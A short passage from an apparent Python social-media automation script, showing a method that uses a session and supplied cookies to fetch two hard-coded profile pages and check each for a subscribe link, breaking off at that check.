		self.nutuk("romi.afrizal.102")
		self.nutuk("romi.alfarabi")
	
	def nutuk(self,userr):
		try:
			ses = requests.Session()
			cek = ses.get(f"{self.urL}/{userr}",cookies=romz_xyz(self.romz)).text
			if "/a/subscribe.php" in cek:
